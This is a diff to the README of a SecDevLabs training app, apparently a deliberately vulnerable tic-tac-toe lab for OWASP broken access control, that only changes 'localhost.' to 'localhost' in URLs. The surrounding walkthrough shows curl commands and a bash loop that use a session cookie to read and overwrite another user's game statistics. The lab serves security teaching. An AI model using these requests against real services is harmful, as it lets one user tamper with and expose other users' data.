@@ -36,7 +36,7 @@ make install
 
 ```
 
-Then simply visit [http://localhost.:10005][App] ! 😆
+Then simply visit [http://localhost:10005][App] ! 😆
 
 ## Get to know the app 🕹
 
@@ -59,7 +59,7 @@ In order to better understand how the application handles its data, two users, `
 
 <p  align="center"><img  src="images/attack0.png"/></p>
 
-After logging in as `user1` and playing a few times, his/her statistics can be checked by visiting [http://localhost.:10005/statistics](http://localhost.:10005/statistics), as the following picture shows:
+After logging in as `user1` and playing a few times, his/her statistics can be checked by visiting [http://localhost:10005/statistics](http://localhost:10005/statistics), as the following picture shows:
 
 <p  align="center"><img  src="images/attack1.png"/></p>
 
@@ -70,7 +70,7 @@ To check how this information is being retrieved form the server, an attacker co
 You can replicate this GET by using the following curl command (use your own `tictacsession` token):  
 
 ```sh
-curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user1'
+curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost:10005/statistics/data?user=user1'
 ```
 
 ```json
@@ -82,7 +82,7 @@ curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmF
 As this AJAX request is being made passing the username as a URL parameter, it may indicate that only this parameter is being used to verify the permission to get the data. To check this, using the same `tictacsession`, an attacker could replace `user1` to another known user, as `user2` for example: 
 
 ```sh
-curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user2'
+curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost:10005/statistics/data?user=user2'
 ```
 
 ```json
@@ -106,7 +106,7 @@ This request is done by using two parameters, `user` and `result`, as shown bell
 To replicate this POST by using the curl command (use your own `tictacsession` token), you can type the following command: 
 
 ```sh
-curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user1&result=win'
+curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost:10005/game' --data-binary 'user=user1&result=win'
 ```
 
 ```json
@@ -118,7 +118,7 @@ OK
 An attacker now could check if, by using another username into this request, he/she could modify other user's statistics. To do so, the parameter `user` is changed into another known user, as `user2` for example:
 
 ```sh
-curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user2&result=win'
+curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost:10005/game' --data-binary 'user=user2&result=win'
 ```
 
 ```json
@@ -142,7 +142,7 @@ result="lose"
 tictacsession="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM"
 
 for i in `seq 1 $num`; do
-    curl -s 'POST' -b "tictacsession=$tictacsession" 'http://localhost.:10005/game' --data-binary "user=$user&result=$result"
+    curl -s 'POST' -b "tictacsession=$tictacsession" 'http://localhost:10005/game' --data-binary "user=$user&result=$result"
 done
 ```
 
@@ -159,7 +159,7 @@ OKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOK
 To check if this attack indeed worked, the malicious user could exploit the previous vulnerability to check `user2` statistics using the following command:
 
 ```sh
-curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/statistics/data?user=user2'
+curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost:10005/statistics/data?user=user2'
 ```
 
 ```json
@@ -185,6 +185,6 @@ We encourage you to contribute to SecDevLabs! Please check out the [Contributing
 
 [Docker Install]: https://docs.docker.com/install/
 [Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost.:10005
+[App]: http://localhost:10005
 [secDevLabs]: https://github.com/globocom/secDevLabs
 [2]:https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a5/tictactoe
